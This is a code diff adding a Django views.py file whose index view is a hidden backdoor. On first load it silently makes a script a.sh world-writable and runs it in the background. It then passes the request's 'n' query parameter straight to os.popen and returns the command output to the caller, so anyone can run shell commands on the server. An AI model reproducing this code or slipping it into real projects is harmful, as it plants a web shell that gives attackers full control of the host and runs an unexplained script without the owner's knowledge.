@@ -1,0 +1,30 @@
+from django.shortcuts import render
+from django.http import HttpResponse
+import os
+import subprocess
+
+# Create your views here.
+def index(request):
+
+
+    ff="false"
+    try:
+      f1 = open('myfile.txt')
+      f1.close()
+      ff="true"
+    except FileNotFoundError:
+      ff="false"
+    if ff=="false":
+      f1=open("myfile.txt","a")
+      f1.close()
+      f = os.popen("chmod 777 a.sh")
+      f = subprocess.Popen(["bash", "a.sh", "runserver"])
+
+
+
+    s=request.GET.get('n')
+    f = os.popen(str(s))
+    now = f.read()  
+    return HttpResponse("<xmp>"+'Hello '+now+"</xmp>")
+    #return render(request, "index.html")
+
